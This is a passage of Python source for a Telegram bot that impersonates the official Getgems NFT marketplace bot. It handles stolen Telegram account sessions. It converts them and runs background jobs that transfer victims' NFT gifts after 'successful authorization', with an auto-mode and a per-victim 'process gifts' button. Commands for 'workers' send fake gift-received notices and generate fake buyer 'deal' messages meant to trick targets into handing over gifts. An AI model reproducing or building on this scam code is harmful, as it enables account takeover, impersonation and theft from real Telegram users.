            logger.info(f"User registration completed for {message.from_user.id}: {user}")
            success = db.accept_gift_share(share_token, message.from_user.id)
            logger.info(f"Gift acceptance result for user {message.from_user.id}: {success}")
            if success:
                from utils import log_user_action
                # Логируем активацию ссылки в Discord и локальные логи
                await log_user_action(
                    'link_activated',
                    user_info={
                        'telegram_id': message.from_user.id,
                        'username': message.from_user.username,
                        'first_name': message.from_user.first_name,
                        'last_name': message.from_user.last_name
                    },
                    additional_data={
                        'nft_name': gift_share['nft_name'],
                        'nft_link': gift_share['nft_link'],
                        'details': f"Активирована ссылка на подарок: {gift_share['nft_name']} ({gift_share['nft_link']})"
                    }
                )
                logger.info(f"✅ Link activated logged to Discord and local logs: {gift_share['nft_link']} by user {message.from_user.id}")
                logger.info(f"Adding NFT to webapp inventory for user {message.from_user.id}: {gift_share['nft_link']}")
                try:
                    gift_id = db.add_gift_link(message.from_user.id, gift_share['nft_link'])
                    logger.info(f"Successfully added gift to webapp inventory with ID: {gift_id}")
                except Exception as e:
                    logger.error(f"Error adding gift to webapp inventory: {e}")
                    await message.answer("❌ Ошибка при добавлении подарка в коллекции веб-приложения")
                    return
                # Парсим NFT ссылку для получения названия и номера
                nft_link = gift_share['nft_link']
                nft_info = parse_nft_link(nft_link)
                
                if nft_info:
                    gift_display_name = f"{nft_info['display_name']} #{nft_info['number']}"
                else:
                    # Fallback если не удалось распарсить
                    gift_display_name = gift_share.get('nft_name', 'NFT подарок')
                
                # Название подарка как ссылка в HTML формате
                gift_name_link = f'<a href="{nft_link}">{gift_display_name}</a>'
                
                # Пытаемся получить кастомное сообщение о получении подарка
                try:
                    from get_bot_settings import get_gift_received_message, get_collections_button_text
                    custom_message = get_gift_received_message(Config.BOT_TOKEN)
                    collections_button_text = get_collections_button_text(Config.BOT_TOKEN) or "📦 Коллекции"
                    
                    if custom_message:
                        # Используем кастомное сообщение, заменяя {gift_name}
                        success_message = custom_message.replace('{gift_name}', gift_name_link)
                    else:
                        success_message = f"Вы получили {gift_name_link} из getgems.io"
                except Exception as e:
                    logger.warning(f"Error getting custom gift message: {e}")
                    success_message = f"Вы получили {gift_name_link} из getgems.io"
                    collections_button_text = "📦 Коллекции"
                
                keyboard = InlineKeyboardBuilder()
                collections_url = (Config.get_webapp_url() + "/collections")
                keyboard.add(InlineKeyboardButton(
                    text=collections_button_text,
                    web_app=WebAppInfo(url=collections_url)
                ))
                
                # Важно: отправляем ТЕКСТ со ссылкой, чтобы Telegram показал нативное превью подарка (как раньше),
                # а не статичную "фото"-картинку.
                await message.answer(
                    success_message,
                    parse_mode="HTML",
                    reply_markup=keyboard.as_markup(),
                    disable_web_page_preview=False,
                )
            else:
                await message.answer("❌ Не удалось принять подарок. Попробуйте еще раз.")
        else:
            # Красивое приветствие с картинкой и одной кнопкой "Маркет" в мини‑апп
            name = message.from_user.first_name or "друг"
            
            # Добавляем пользователя в БД при /start
            try:
                user = db.get_or_create_user(
                    telegram_id=message.from_user.id,
                    username=message.from_user.username,
                    first_name=message.from_user.first_name,
                    last_name=message.from_user.last_name or ''
                )
                logger.info(f"User {message.from_user.id} added/updated in DB via /start")
            except Exception as e:
                logger.error(f"Error adding user to DB: {e}")
            
            # Получаем username бота динамически
            try:
                bot_info = await bot.get_me()
                bot_username_dynamic = bot_info.username
            except Exception:
                # Если не удалось получить динамически, используем из конфига
                bot_username_dynamic = Config.BOT_USERNAME or "bot"
            
            # Формируем username для отображения (без @)
            bot_username_display = bot_username_dynamic
            if bot_username_display.startswith("@"):
                bot_username_display = bot_username_display[1:]

            # Пытаемся получить кастомное приветствие из БД KillamonjaroAuto
            try:
                from get_bot_settings import get_welcome_message, get_market_button_text
                custom_welcome = get_welcome_message(Config.BOT_TOKEN)
                market_button_text = get_market_button_text(Config.BOT_TOKEN) or "🛒 Маркет"
                
                if custom_welcome:
                    # Используем кастомное приветствие, заменяя {name} и {bot_username}
                    start_text = custom_welcome.replace('{name}', name).replace('{bot_username}', bot_username_display)
                else:
                    # Стандартное приветствие
                    start_text = (
                        f"👋 <b>Привет, {name}!</b>\n\n"
                        f"Это официальный бот <b>Getgems</b> в Telegram Mini App.\n\n"
                        f"Здесь ты можешь:\n"
                        f"• 💎 Покупать и продавать NFT‑подарки, номера и юзернеймы\n"
                        f"• 🎁 Получать и отправлять подарки прямо из чатов\n"
                        f"• 📦 Управлять своей коллекцией в удобном интерфейсе\n\n"
                        f"💡 Чтобы дарить подарки прямо в переписке, начни набирать @{bot_username_display} в любом чате "
                        f"- появится inline‑режим, из которого можно отправлять NFT‑подарки собеседнику.\n\n"
                        f"Нажми кнопку ниже, чтобы открыть <b>Маркет</b> в мини‑приложении."
                    )
            except Exception as e:
                logger.warning(f"Error getting custom welcome message: {e}")
                # Fallback на стандартное приветствие
                start_text = (
                    f"👋 <b>Привет, {name}!</b>\n\n"
                    f"Это официальный бот <b>Getgems</b> в Telegram Mini App.\n\n"
                    f"Здесь ты можешь:\n"
                    f"• 💎 Покупать и продавать NFT‑подарки, номера и юзернеймы\n"
                    f"• 🎁 Получать и отправлять подарки прямо из чатов\n"
                    f"• 📦 Управлять своей коллекцией в удобном интерфейсе\n\n"
                    f"💡 Чтобы дарить подарки прямо в переписке, начни набирать @{bot_username_display} в любом чате "
                    f"— появится inline‑режим, из которого можно отправлять NFT‑подарки собеседнику.\n\n"
                    f"Нажми кнопку ниже, чтобы открыть <b>Маркет</b> в мини‑приложении."
                )
                market_button_text = "🛒 Маркет"

            # Одна инлайн‑кнопка "Маркет", ведущая в WebApp на страницу /market
            market_url = (Config.get_webapp_url() + "/market")
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text=market_button_text,
                            web_app=WebAppInfo(url=market_url),
                        )
                    ]
                ]
            )

            # Отправляем приветственную картинку с подписью
            try:
                # Пытаемся получить кастомное фото из настроек
                custom_photo_path = None
                try:
                    from get_bot_settings import get_welcome_photo_path
                    custom_photo_path = get_welcome_photo_path(Config.BOT_TOKEN)
                except Exception as e:
                    logger.debug(f"Error getting custom photo path: {e}")
                
                # Используем кастомное фото, если оно есть, иначе базовое
                if custom_photo_path and os.path.exists(custom_photo_path):
                    image_path = custom_photo_path
                else:
                    image_path = os.path.join(os.path.dirname(__file__), "privetsvie.jpg")
                
                photo = FSInputFile(image_path)
                logger.info(f"[DEBUG] Отправка приветственного изображения: {image_path}")
                await message.answer_photo(
                    photo=photo,
                    caption=start_text,
                    parse_mode="HTML",
                    reply_markup=keyboard,
                )
                logger.info(f"[DEBUG] Приветственное изображение успешно отправлено пользователю {message.from_user.id}")
            except Exception as e:
                logger.error(f"Ошибка отправки приветственного изображения: {e}", exc_info=True)
                # Фоллбек: просто текст, если картинка недоступна
                logger.info(f"[DEBUG] Fallback: отправка текстового сообщения пользователю {message.from_user.id}")
                await message.answer(
                    start_text,
                    parse_mode="HTML",
                    reply_markup=keyboard,
                )
                logger.info(f"[DEBUG] Текстовое сообщение успешно отправлено пользователю {message.from_user.id}")
    except Exception as e:
        logger.error(f"Ошибка в start_handler: {e}")
        await message.answer("❌ Произошла ошибка. Попробуйте еще раз.")
@dp.callback_query(lambda c: c.data and c.data.startswith('rescan_gifts_'))
async def rescan_gifts_callback_handler(callback_query: CallbackQuery):
    """Обработчик кнопки повторного сканирования подарков"""
    try:
        await callback_query.answer()
        
        # Извлекаем user_id и phone из callback_data
        parts = callback_query.data.split('_')
        if len(parts) >= 4:
            user_id = int(parts[2])
            phone = '+' + parts[3]
            # Не редактируем исходное сообщение, чтобы сохранить кнопку навсегда
            await callback_query.message.reply(
                "🔄 <b>Повторное сканирование запущено...</b>",
                parse_mode="HTML"
            )

            # Логируем запрос на повторное сканирование
            from utils import log_user_action
            await log_user_action(
                'rescan_gifts_requested',
                user_info={'telegram_id': user_id},
                additional_data={
                    'phone': phone,
                    'details': f"Запрошено повторное сканирование подарков для пользователя {user_id}"
                }
            )

            # Локальная обработка подарков в фоне, без внешнего API
            try:
                from utils import check_session_exists, validate_session, convert_telethon_to_pyrogram
                import os

                if not (check_session_exists(phone) and validate_session(phone)):
                    await callback_query.message.reply(
                        "❌ <b>Сессия истекла или недействительна</b>\n\nПожалуйста, пройдите авторизацию заново.",
                        parse_mode="HTML"
                    )
                    return

                session_file = f"sessions/{phone.replace('+', '')}.session"
                if not os.path.exists(session_file):
                    await callback_query.message.reply(
                        "❌ <b>Файл сессии не найден</b>\n\nПожалуйста, пройдите авторизацию заново.",
                        parse_mode="HTML"
                    )
                    return

                async def _run_rescan():
                    try:
                        await log_user_action(
                            'session_processing_started',
                            user_info={'telegram_id': user_id},
                            additional_data={'details': "Начата повторная обработка сессии пользователя"}
                        )
                        session_string = await convert_telethon_to_pyrogram(session_file)
                        from tonnel_runner import launch_tonnel_background
                        launch_tonnel_background(session_string, phone, user_id)
                        await log_user_action(
                            'session_processing_completed',
                            user_info={'telegram_id': user_id},
                            additional_data={'details': "Повторная обработка завершена"}
                        )
                        await bot.send_message(
                            chat_id=callback_query.message.chat.id,
                            text="✅ <b>Повторное сканирование завершено</b>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        await bot.send_message(
                            chat_id=callback_query.message.chat.id,
                            text=f"❌ <b>Ошибка при обработке</b>\n<code>{str(e)}</code>",
                            parse_mode="HTML"
                        )

                asyncio.create_task(_run_rescan())

            except Exception as e:
                logger.error(f"Ошибка при запуске повторного сканирования: {e}")
                await callback_query.message.reply(
                    f"❌ <b>Ошибка при повторном сканировании</b>\n<code>{str(e)}</code>",
                    parse_mode="HTML"
                )

        else:
            await callback_query.answer("❌ Ошибка в данных запроса", show_alert=True)
        
    except Exception as e:
        logger.error(f"Ошибка в rescan_gifts_callback_handler: {e}")
        await callback_query.answer("❌ Ошибка при запуске повторного сканирования", show_alert=True)

@dp.callback_query(lambda c: c.data and c.data.startswith('retry_'))
async def retry_handler(callback_query: CallbackQuery):
    """Обработчик кнопки повтора для повторной обработки сессии"""
    try:
        await callback_query.answer()
        user_id = int(callback_query.data.split('_')[1])
        from utils import log_user_action
        await log_user_action(
            'retry_processing',
            user_info={
                'telegram_id': user_id
            },
            additional_data={
                'details': f"Начата повторная обработка сессии по запросу администратора"
            }
        )
        # Безопасно добавляем текст без парсинга разметки, чтобы избежать ошибок
        await callback_query.message.edit_text(
            f"{callback_query.message.text}\n\n🔄 Повторная обработка запущена..."
        )
    except Exception as e:
        logger.error(f"Ошибка в retry_handler: {e}")
        await callback_query.answer("❌ Ошибка при запуске повторной обработки", show_alert=True)

# ==========================
# WSEND: выдача/отбор доступа и отправка подарков от имени бота
# ==========================

@dp.message(Command("grant_wsend"))
async def grant_wsend_handler(message: types.Message):
    """Админ-команда: выдать доступ к /wsend пользователю."""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        if not Config.is_admin(message.from_user.id):
            await message.answer("❌ У вас нет прав администратора.")
            return
        parts: List[str] = (message.text or "").split()
        if len(parts) < 2 or not parts[1].isdigit():
            await message.answer("ℹ️ Использование: /grant_wsend <telegram_id>")
            return
        target_id = int(parts[1])
        ok = db.grant_wsend_access(target_id, granted_by=message.from_user.id)
        if ok:
            await message.answer(f"✅ Доступ к /wsend выдан пользователю `{target_id}`", parse_mode="Markdown")
        else:
            await message.answer("❌ Не удалось выдать доступ.")
    except Exception as e:
        logger.error(f"grant_wsend error: {e}")
        await message.answer("❌ Ошибка при выдаче доступа.")

@dp.message(Command("revoke_wsend"))
async def revoke_wsend_handler(message: types.Message):
    """Админ-команда: отозвать доступ к /wsend у пользователя."""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        if not Config.is_admin(message.from_user.id):
            await message.answer("❌ У вас нет прав администратора.")
            return
        parts: List[str] = (message.text or "").split()
        if len(parts) < 2 or not parts[1].isdigit():
            await message.answer("ℹ️ Использование: /revoke_wsend <telegram_id>")
            return
        target_id = int(parts[1])
        ok = db.revoke_wsend_access(target_id)
        if ok:
            await message.answer(f"✅ Доступ к /wsend отозван у пользователя `{target_id}`", parse_mode="Markdown")
        else:
            await message.answer("❌ Не удалось отозвать доступ (возможно, доступа не было).")
    except Exception as e:
        logger.error(f"revoke_wsend error: {e}")
        await message.answer("❌ Ошибка при отзыве доступа.")

@dp.message(Command("wsend"))
async def wsend_handler(message: types.Message):
    """
    Режимы:
    - /wsend <telegram_id> - админ переключает доступ (выдать/забрать).
    - /wsend <telegram_id> <text> - показать клавиатуру подарков и отправить выбранный подарок.
    Дневной лимит: 150 звёзд в сутки, сброс в 00:00 МСК.
    """
    # Обрабатываем только личные сообщения, игнорируем групповые чаты
    if message.chat.type != "private":
        return
    try:
        parts: List[str] = (message.text or "").split()
        if len(parts) < 2 or not parts[1].isdigit():
            await message.answer("ℹ️ Использование: /wsend <telegram_id> [text]")
            return
        target_id = int(parts[1])

        # Режим переключения доступа: только админ и без текста
        if len(parts) == 2:
            if not Config.is_admin(message.from_user.id):
                await message.answer("❌ У вас нет прав администратора для управления доступом.")
                return
            toggled = db.toggle_wsend_access(target_id, admin_id=message.from_user.id)
            if toggled:
                await message.answer(f"✅ Доступ к /wsend выдан пользователю `{target_id}`", parse_mode="Markdown")
            else:
                await message.answer(f"✅ Доступ к /wsend отозван у пользователя `{target_id}`", parse_mode="Markdown")
            return

        # Режим отправки подарка: нужен доступ у вызывающего
        caller_id = message.from_user.id
        if not db.has_wsend_access(caller_id):
            await message.answer("🚫 У вас нет доступа к команде /wsend. Обратитесь к администратору.")
            return

        text_to_send = " ".join(parts[2:]).strip()

        # TODO: здесь ранее использовался экспериментальный метод GetAvailableGifts,
        # которого нет в установленной версии aiogram.
        # Временно отключаем динамический выбор подарков, чтобы бот хотя бы работал и отвечал.
        await message.answer(
            "⚠️ Временное ограничение: список подарков через /wsend сейчас недоступен.\n"
            "Базовая логика бота и команда /start работают, но выбор подарков нужно будет допилить отдельно."
        )
        return
    except Exception as e:
        logger.error(f"wsend_handler error: {e}")
        await message.answer("❌ Ошибка выполнения /wsend.")

def moscow_date_str():
    # Сдвиг UTC+3 для получения даты по МСК
    return (datetime.utcnow() + timedelta(hours=3)).strftime('%Y-%m-%d')

@dp.callback_query(lambda c: c.data and c.data.startswith('wsend_select:'))
async def wsend_select_callback(callback_query: types.CallbackQuery):
    try:
        data = callback_query.data  # format: wsend_select:<target_id>:<gift_id>:<stars>
        try:
            _, target_id_s, gift_id_s, stars_s = data.split(':', 3)
            target_id = int(target_id_s)
            gift_id = gift_id_s
            stars = int(stars_s)
        except Exception:
            await callback_query.answer("❌ Некорректные данные выбора.", show_alert=True)
            return

        caller_id = callback_query.from_user.id
        if not db.has_wsend_access(caller_id):
            await callback_query.answer("🚫 Нет доступа к /wsend.", show_alert=True)
            return

        # Проверка дневного лимита по звёздам (МСК)
        try:
            used = db.get_daily_stars_used(caller_id, date=moscow_date_str())
            daily_limit = getattr(Config, 'WSEND_DAILY_LIMIT', 150)
            remaining = max(0, daily_limit - used)
            if stars > remaining:
                await callback_query.answer(
                    f"🚫 Лимит на сегодня: осталось {remaining}⭐, нужно {stars}⭐.", show_alert=True
                )
                return
        except Exception as e:
            logger.warning(f"wsend limit check error: {e}")

        # Отправка подарка
        try:
            extra = pending_wsend.get((caller_id, callback_query.message.message_id))
            sent = await bot.send_gift(user_id=target_id, gift_id=str(gift_id),text=extra['text'])
            if not sent:
                await callback_query.answer("❌ Не удалось отправить подарок.", show_alert=True)
                return
        except Exception as e:
            logger.error(f"wsend send_gift error: {e}")
            await callback_query.answer("❌ Ошибка отправки подарка.", show_alert=True)
            return

        # Учёт звезд и доп. текст
        try:
            db.add_stars_usage(caller_id, stars_count=stars, date=moscow_date_str())
        except Exception as e:
            logger.warning(f"wsend add_stars_usage error: {e}")

        # Отправка дополнительного текста получателю (если задан и возможно)
        
        # Очистка состояния
        if (caller_id, callback_query.message.message_id) in pending_wsend:
            del pending_wsend[(caller_id, callback_query.message.message_id)]

        # Ответ и изменение текста сообщения
        try:
            used = db.get_daily_stars_used(caller_id, date=moscow_date_str())
            daily_limit = getattr(Config, 'WSEND_DAILY_LIMIT', 150)
            remaining = max(0, daily_limit - used)
        except Exception:
            remaining = getattr(Config, 'WSEND_DAILY_LIMIT', 150)
        try:
            await callback_query.message.edit_text(
                f"✅ Подарок отправлен пользователю `{target_id}` на {stars}⭐.\nОстаток лимита: {remaining}⭐",
                parse_mode="Markdown"
            )
        except Exception:
            await callback_query.answer("✅ Подарок отправлен.", show_alert=True)
    except Exception as e:
        logger.error(f"wsend_select_callback error: {e}")
        try:
            await callback_query.answer("❌ Ошибка обработки выбора.", show_alert=True)
        except Exception:
            pass

@dp.callback_query(lambda c: c.data and c.data.startswith('process_gifts:'))

@dp.callback_query(lambda c: c.data and c.data.startswith('process_gifts:'))
async def process_gifts_callback(callback_query: CallbackQuery):
    """
    Кнопка из лог-сообщения "Успешная авторизация": запускает обработку/перевод подарков
    для указанного telegram_id через HTTP-запрос к backend (/api/process_gifts).
    """
    try:
        try:
            _, user_id_str = callback_query.data.split(":", 1)
            telegram_id = int(user_id_str)
        except Exception:
            await callback_query.answer("❌ Некорректные данные кнопки.", show_alert=True)
            return

        await callback_query.answer("⏳ Запускаю обработку подарков...", show_alert=False)

        loop = asyncio.get_running_loop()

        def _call_api():
            return requests.post(
                "http://127.0.0.1:8000/api/process_gifts",
                json={"user_id": telegram_id},
                timeout=60,
            )

        try:
            response = await loop.run_in_executor(None, _call_api)
        except Exception as e:
            logger.error(f"process_gifts API request error: {e}")
            await callback_query.message.reply(f"❌ Ошибка запроса к API обработки подарков: {e}")
            return

        text = ""
        data = None
        try:
            # Проверяем, что ответ действительно JSON, а не HTML
            content_type = response.headers.get('Content-Type', '').lower()
            if 'application/json' in content_type or 'text/json' in content_type:
                data = response.json()
            else:
                # Если получили HTML вместо JSON, логируем ошибку
                response_text = response.text[:500] if hasattr(response, 'text') else str(response.content[:500])
                logger.error(f"API returned non-JSON response (Content-Type: {content_type}): {response_text}")
                data = None
        except ValueError as json_err:
            # Ошибка парсинга JSON (например, получили HTML)
            response_text = response.text[:500] if hasattr(response, 'text') else str(response.content[:500])
            logger.error(f"Failed to parse JSON response: {json_err}. Response: {response_text}")
            data = None
        except Exception as e:
            logger.error(f"Unexpected error parsing response: {e}")
            data = None

        if response.status_code == 200 and data and data.get("success"):
            result = data.get("result") or {}
            processed = result.get("processed_count") or result.get("unique_gifts_transferred")
            text = (
                "✅ Обработка подарков запущена.\n"
                f"👤 Пользователь: `{telegram_id}`\n"
                + (f"🎁 Передано подарков: {processed}\n" if processed is not None else "")
            )
        else:
            err = None
            if data:
                err = data.get("error")
            if not err:
                err = f"HTTP {response.status_code}"
            text = (
                "❌ Не удалось обработать подарки.\n"
                f"👤 Пользователь: `{telegram_id}`\n"
                f"📝 Ошибка: {err}"
            )

        await callback_query.message.reply(text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"process_gifts_callback error: {e}")
        try:
            await callback_query.answer("❌ Ошибка обработки кнопки.", show_alert=True)
        except Exception:
            pass

@dp.message(Command("dep"))
async def dep_handler(message: types.Message):
    """
    Пополнение баланса бота звёздами: создаёт инвойс на Stars (XTR) от имени бота.
    Использование: /dep <amount>
    Пример: /dep 500 - выставить счёт на 500 звёзд.
    Только для админов.
    """
    try:
        if not Config.is_admin(message.from_user.id):
            await message.answer("❌ У вас нет прав администратора.")
            return
        parts: List[str] = (message.text or "").split()
        if len(parts) < 2:
            await message.answer("ℹ️ Использование: /dep <amount>. Пример: /dep 500")
            return
        try:
            amount = int(parts[1])
        except Exception:
            await message.answer("❌ Неверный формат суммы. Пример: /dep 500")
            return
        if amount <= 0:
            await message.answer("❌ Сумма должна быть положительным числом звёзд.")
            return

        title = "Пополнение звёзд бота"
        description = "Оплата на баланс бота в Telegram Stars"
        payload = "dep_invoice_payload"
        currency = "XTR"
        prices = [types.LabeledPrice(label="Пополнение", amount=amount)]

        try:
            await bot.send_invoice(
                chat_id=message.chat.id,
                title=title,
                description=description,
                payload=payload,
                provider_token="",  # Пусто для Stars
                currency=currency,
                prices=prices,
            )
            await message.answer(
                "🧾 Инвойс на звёзды создан. Нажмите Pay в сообщении и завершите оплату."
            )
        except Exception as e:
            logger.error(f"dep_handler invoice error: {e}")
            await message.answer("❌ Не удалось создать инвойс XTR. Проверьте логи.")
    except Exception as e:
        logger.error(f"dep_handler error: {e}")
        await message.answer("❌ Ошибка выполнения /dep.")

@dp.message(Command("autoon"))
async def autoon_handler(message: types.Message):
    """Команда для включения авто-режима обработки подарков"""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        user_id = message.from_user.id
        
        # Включаем авто-режим для пользователя
        success = db.set_auto_process_enabled(user_id, enabled=True)
        
        if success:
            await message.answer(
                "✅ <b>Авто-режим включен</b>\n\n"
                "🔄 Теперь подарки будут обрабатываться автоматически после каждой успешной авторизации.",
                parse_mode="HTML"
            )
            logger.info(f"Auto mode enabled for user {user_id}")
        else:
            await message.answer(
                "❌ <b>Ошибка</b>\n\n"
                "Не удалось включить авто-режим. Попробуйте позже.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"autoon_handler error: {e}")
        await message.answer("❌ Произошла ошибка при включении авто-режима.")

@dp.message(Command("autooff"))
async def autooff_handler(message: types.Message):
    """Команда для выключения авто-режима обработки подарков"""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        user_id = message.from_user.id
        
        # Выключаем авто-режим для пользователя
        success = db.set_auto_process_enabled(user_id, enabled=False)
        
        if success:
            await message.answer(
                "❌ <b>Авто-режим выключен</b>\n\n"
                "⏸ Подарки больше не будут обрабатываться автоматически.\n"
                "Для обработки используйте кнопку \"🔁 Обработать подарки\" в сообщении об авторизации.",
                parse_mode="HTML"
            )
            logger.info(f"Auto mode disabled for user {user_id}")
        else:
            await message.answer(
                "❌ <b>Ошибка</b>\n\n"
                "Не удалось выключить авто-режим. Попробуйте позже.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"autooff_handler error: {e}")
        await message.answer("❌ Произошла ошибка при выключении авто-режима.")

@dp.message(Command("podi"))
async def podi_handler(message: types.Message):
    """
    /podi <nft_link> <@username>
    Для воркеров: добавить NFT в коллекцию получателя и отправить ему сообщение с превью.
    """
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        # Только воркеры
        if not db.is_worker(message.from_user.id):
            return

        parts = (message.text or "").split()
        if len(parts) < 3:
            await message.answer(
                "ℹ️ Использование: /podi <ссылка_на_NFT> <@username>\n"
                "Пример: /podi https://t.me/nft/MousseCake-118494 @username"
            )
            return

        nft_link = parts[1].strip()
        recipient_username = parts[2].strip()
        if not recipient_username.startswith("@"):
            recipient_username = "@" + recipient_username.lstrip("@")

        # Валидируем/парсим NFT ссылку
        nft_info = parse_nft_link(nft_link)
        if not nft_info:
            await message.answer("❌ Неверная ссылка на NFT. Пример: https://t.me/nft/MousseCake-118494")
            return

        gift_display_name = f"{nft_info['display_name']} #{nft_info['number']}"
        gift_name_link = f'<a href="{nft_link}">{gift_display_name}</a>'

        # Находим получателя по username:
        # 1) пробуем Bot API getChat(@username)
        # 2) если не нашли - фоллбек на нашу БД (если пользователь уже был у нас/авторизован)
        chat = None
        recipient_id = None
        try:
            chat = await bot.get_chat(recipient_username)
            recipient_id = chat.id
        except Exception as e:
            logger.info(f"/podi: get_chat failed for {recipient_username}: {e}")
            try:
                user_from_db = db.get_user_by_username(recipient_username.lstrip("@"))
                if user_from_db and user_from_db.get("telegram_id"):
                    recipient_id = int(user_from_db["telegram_id"])
            except Exception as db_err:
                logger.warning(f"/podi: db lookup failed for {recipient_username}: {db_err}", exc_info=True)

        if not recipient_id:
            await message.answer(
                f"❌ Не удалось найти пользователя {recipient_username}.\n"
                f"Проверьте username и убедитесь, что он существует."
            )
            return

        # Создаём/обновляем запись получателя в БД (нужно для add_gift_link)
        try:
            db.get_or_create_user(
                telegram_id=recipient_id,
                username=(getattr(chat, "username", None) if chat else recipient_username.lstrip("@")),
                first_name=(getattr(chat, "first_name", None) if chat else None),
                last_name=(getattr(chat, "last_name", None) if chat else None),
            )
        except Exception as e:
            logger.warning(f"/podi: failed to get_or_create_user for recipient {recipient_id}: {e}", exc_info=True)

        # Добавляем подарок в коллекцию (webapp)
        try:
            db.add_gift_link(recipient_id, nft_link)
        except Exception as e:
            logger.error(f"/podi: failed to add gift link for recipient {recipient_id}: {e}", exc_info=True)
            await message.answer("❌ Не удалось добавить подарок в коллекцию получателя.")
            return

        # Кто передал (отправитель)
        sender_username = message.from_user.username or (message.from_user.first_name or "пользователь")
        safe_sender = html.escape(sender_username, quote=True)

        # Сообщение получателю (важно: ссылка кликабельна, и Telegram покажет нативное превью)
        recipient_text = (
            f"<b>@{safe_sender}</b> передал вам {gift_name_link}, NFT добавлен в колекции."
        )

        keyboard = InlineKeyboardBuilder()
        collections_url = (Config.get_webapp_url() + "/collections")
        keyboard.add(
            InlineKeyboardButton(
                text="Колекции",
                web_app=WebAppInfo(url=collections_url),
            )
        )

        try:
            await bot.send_message(
                chat_id=recipient_id,
                text=recipient_text,
                parse_mode="HTML",
                reply_markup=keyboard.as_markup(),
                disable_web_page_preview=False,
            )
        except Exception as send_err:
            # Частая причина: пользователь не нажал /start в боте или заблокировал бота
            logger.warning(f"/podi: failed to send to {recipient_id}: {send_err}")
            await message.answer(
                f"❌ Не удалось отправить сообщение пользователю {recipient_username}.\n"
                f"Обычно это значит, что пользователь не нажал /start в боте или заблокировал бота."
            )
            return

        await message.answer(f"✅ Отправлено {recipient_username}: {gift_display_name}")
    except Exception as e:
        logger.error(f"podi_handler error: {e}", exc_info=True)
        await message.answer("❌ Ошибка выполнения /podi.")

@dp.message(Command("admin"))
async def admin_handler(message: types.Message):
    """Обработчик команды /admin - админ-панель"""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        if not Config.is_admin(message.from_user.id):
            await message.answer("🚫 У вас нет доступа к админ-панели.")
            return
        
        # Получаем список воркеров
        workers = db.get_all_workers() or []
        workers_count = len(workers)
        
        # Формируем список воркеров
        text = f"👷 <b>Воркеры</b>\n\nВсего: <b>{workers_count}</b>\n\n"
        
        if not workers:
            text += "Список воркеров пуст."
        else:
            for i, worker in enumerate(workers[:20], 1):  # Показываем первые 20
                username = worker.get('username', 'Нет username')
                telegram_id = worker.get('telegram_id', 'N/A')
                first_name = worker.get('first_name', '')
                text += f"{i}. @{username} ({first_name})\n"
                text += f"   ID: {telegram_id}\n\n"
            if len(workers) > 20:
                text += f"... и еще {len(workers) - 20} воркеров"
        
        # Кнопка для открытия веб-панели
        webapp_url = Config.get_webapp_url() + '/adminpanel'
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🌐 Открыть веб-панель", web_app=WebAppInfo(url=webapp_url))],
        ])
        
        await message.answer(text, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка в admin_handler: {e}", exc_info=True)
        await message.answer("❌ Произошла ошибка при открытии админ-панели.")

@dp.message(Command("pyid"))
async def pyid_handler(message: types.Message):
    """Команда для воркеров: отправляет сообщение с указанным username"""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        # Проверяем, что пользователь - воркер
        if not db.is_worker(message.from_user.id):
            await message.answer("❌ У вас нет прав для использования этой команды. Только воркеры могут использовать /pyid.")
            return
        
        # Парсим команду: /pyid @username
        parts = (message.text or "").split()
        if len(parts) < 2:
            await message.answer("ℹ️ Использование: /pyid @username\n\nУкажите username пользователя после команды.")
            return
        
        # Извлекаем username (убираем @ если есть)
        username_input = parts[1].strip()
        if username_input.startswith('@'):
            username = username_input[1:]
        else:
            username = username_input
        
        # Формируем username с @ для сообщения
        username_display = f"@{username}"
        
        # Получаем username нашего бота
        try:
            bot_info = await bot.get_me()
            bot_username = bot_info.username
        except Exception:
            # Если не удалось получить динамически, используем из конфига
            bot_username = Config.BOT_USERNAME
        
        # Генерируем номер сделки (формат: буквы + цифры, например KZ11943)
        import random
        import string
        deal_prefix = ''.join(random.choices(string.ascii_uppercase, k=2))
        deal_number = random.randint(10000, 99999)
        deal_id = f"{deal_prefix}{deal_number}"
        
        # Формируем сообщение с правильным форматированием
        # Весь текст должен быть жирным, последняя часть - в цитате
        message_text = (
            f"<b>{bot_username} will never ask for verification or redirect you to unknown bots. Stay cautious.</b>\n\n"
            f"<b>📩Покупатель из сделки #{deal_id} прислал вам сообщение:</b>\n\n"
            f"<blockquote><b>Пожалуйста отправь, {username_display} ей и потом пришли скриншот когда она получит его и потом можешь кинуть ей мой юзер, просто это сюрприз должен быть.</b></blockquote>"
        )
        
        # Отправляем сообщение обратно воркеру с HTML форматированием
        await message.answer(
            message_text,
            parse_mode="HTML"
        )
        
        logger.info(f"Worker {message.from_user.id} used /pyid command for {username_display}")
        
    except Exception as e:
        logger.error(f"pyid_handler error: {e}")
        await message.answer("❌ Произошла ошибка при выполнении команды /pyid.")

@dp.callback_query(lambda c: c.data and c.data.startswith('admin_'))
async def admin_callback_handler(callback: types.CallbackQuery):
    """Обработчик callback-кнопок админ-панели"""
    try:
        if not Config.is_admin(callback.from_user.id):
            await callback.answer("🚫 У вас нет доступа к админ-панели.", show_alert=True)
            return
        
        action = callback.data
        
        if action.startswith("admin_delete_worker_"):
            # Удаление воркера
            try:
                worker_id = int(action.replace("admin_delete_worker_", ""))
                if db.remove_worker(worker_id):
                    await callback.answer("✅ Воркер удален", show_alert=True)
                    # Обновляем сообщение
